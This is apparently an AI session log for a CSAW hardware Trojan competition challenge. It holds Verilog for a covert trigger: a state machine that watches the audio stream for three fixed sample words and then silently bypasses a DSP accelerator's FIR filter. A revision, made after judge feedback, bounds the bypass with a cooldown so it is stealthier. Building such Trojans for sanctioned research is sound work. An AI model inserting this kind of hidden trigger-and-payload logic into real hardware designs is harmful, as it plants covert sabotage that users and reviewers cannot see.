# AI interaction record — T1 revision

## User objective

The user asked for a Challenge 3 hardware Trojan against the 2026 CSAW streaming DSP accelerator, three distinct trigger/payload candidates, a focused primary design, and research for maximizing Bonus B, targeting at least 95/100 base points through iteration. The user authorized read-only use of the supplied GitHub references and local materials. The user later clarified: “make new files and do not alter preexisting files. if you altered any preexisting files revert them.” All authored/edited files for this revision are new files under `outputs/challenge3/`; original files under Downloads were only read.

## AI generation prompt/specification

See `GENERATION_SPEC.md`. The primary design uses an exact left-sample sequence trigger and a sample-aligned raw-input bypass payload. It preserves the pre-trigger FIR path and the right-channel echo.

## AI-generated RTL response (iteration 1; superseded after judge feedback)

The trigger FSM and payload selection generated for this revision are:

```verilog
localparam signed [15:0] TRIGGER_WORD0 = 16'sh5A3C;
localparam signed [15:0] TRIGGER_WORD1 = 16'shC3A5;
localparam signed [15:0] TRIGGER_WORD2 = 16'sh96E1;
localparam [1:0] ST_IDLE = 2'd0;
localparam [1:0] ST_WORD0 = 2'd1;
localparam [1:0] ST_WORD01 = 2'd2;
localparam [1:0] ST_FIRED = 2'd3;
reg [1:0] trigger_state;
reg       payload_active;

always @(posedge ICE_CLK) begin
    if (new_sample && !payload_active) begin
        case (trigger_state)
            ST_IDLE: begin
                trigger_state <= ($signed(left_sample) == TRIGGER_WORD0)
                               ? ST_WORD0 : ST_IDLE;
            end
            ST_WORD0: begin
                if ($signed(left_sample) == TRIGGER_WORD1)
                    trigger_state <= ST_WORD01;
                else if ($signed(left_sample) == TRIGGER_WORD0)
                    trigger_state <= ST_WORD0;
                else
                    trigger_state <= ST_IDLE;
            end
            ST_WORD01: begin
                if ($signed(left_sample) == TRIGGER_WORD2) begin
                    trigger_state  <= ST_FIRED;
                    payload_active <= 1'b1;
                end else if ($signed(left_sample) == TRIGGER_WORD0) begin
                    trigger_state <= ST_WORD0;
                end else begin
                    trigger_state <= ST_IDLE;
                end
            end
            default: trigger_state <= ST_FIRED;
        endcase
    end
end

// In the existing MAC-completion block:
if (payload_active)
    y_filt <= $signed(left_sample);
else
    y_filt <= round_sat(acc);
```

`left_sample` is held from the completed input frame until the next I2S frame. At the official maximum BCLK of 1 MHz, the 63-cycle MAC completes within the 320 `ICE_CLK` cycles between frames. This is a design argument, not yet a simulator or board result.

## Generated exploit/test artifacts

- `../tb/make_t1_wav.py` writes pass-band audio, the three trigger words, then a stop-band tone.
- `../tb/run_tests.py` updates the independent sample oracle for bypass behavior and adds the 1,024-zero flush plus `random.Random(2026)` self-test vector.
- `../tb/tb_i2s.sv` and `../tb/phase4_dut_adapter.sv` are copied into this new deliverable from the first-attempt test folder; the original copies were not changed.

## Evidence and limits

This session inspected the official Challenge 3 README/interface description, the linked reference repositories, and local candidate/research files. It did not run the new RTL, testbench, synthesis, board programming, or audio capture. Icarus Verilog, Yosys, and nextpnr were not available on `PATH`. The existing candidate's original coefficient set still needs comparison against the official bitstream, and the prior source's original AI provenance/logs must be included or regenerated before submission.

This file is a concise artifact log, not a complete export of the Codex conversation. Add the full conversation export and any prior AI logs to meet the challenge's comprehensive-transcript requirement.

## Judge feedback and iteration 2: bounded bypass

The judges identified the permanent post-trigger bypass as insufficiently stealthy because normal filtering never resumed. The updated T1 keeps the exact three-sample trigger but limits raw-sample bypass to 128 input frames, including the trigger-completing frame. It then clears payload_active and returns to the FIR path. A 1,024-frame cooldown prevents immediate retriggering from making the bypass appear continuous, after which the matcher returns to idle.

The RTL state is driven by two frame counters:

    localparam [7:0] BYPASS_FRAMES = 8'd128;
    localparam [10:0] COOLDOWN_FRAMES = 11'd1024;
    reg [7:0] bypass_frames_remaining;
    reg [10:0] cooldown_frames_remaining;

When the trigger completes, payload_active is set and bypass_frames_remaining is loaded with 128. Each later left-sample event consumes one frame; when one frame remains, the trigger logic clears payload_active, loads the 1,024-frame cooldown, and resets the trigger FSM. The MAC completion mux therefore passes only the bounded burst and uses round_sat(acc) afterward.

The test oracle now checks payload expiry, rejection of a trigger during cooldown, and successful re-arming after cooldown. The WAV generator holds a stop-band tone long enough to show the bypass pulse and subsequent FIR recovery. These are prepared checks only: the machine still lacks a runnable Python/Icarus/Yosys/nextpnr toolchain, and no board run has been performed. The original full-conversation export and source-provenance logs are still required for submission.